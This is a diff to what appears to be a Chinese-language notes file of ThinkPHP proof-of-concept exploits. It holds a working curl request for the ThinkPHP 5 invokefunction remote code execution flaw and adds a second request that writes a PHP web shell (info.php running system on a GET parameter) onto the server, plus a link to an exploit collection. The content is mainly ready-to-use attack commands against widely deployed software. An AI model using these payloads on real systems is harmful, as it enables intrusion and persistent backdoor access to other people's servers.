@@ -12,11 +12,13 @@ Poc
 
 ```
 curl -g '127.0.0.1/public/index.php/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id'
+curl -g '127.0.0.1/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=info.php&vars[1][]=<?php%20system($_GET[0]);?>'
 ```
 
 参考文档
 
 * [thinkphp5框架缺陷导致远程代码执行](https://mp.weixin.qq.com/s/oWzDIIjJS2cwjb4rzOM4DQ)
+* [thinkphp_v5_rce.txt](https://github.com/coffeehb/Some-PoC-oR-ExP/blob/a9f165d7bc5bcc2b5e03153577bdfd83f35b0564/thinkphp/thinkphp_v5_rce.txt)
 
 ## Thinkphp preg_replace 代码执行漏洞
 
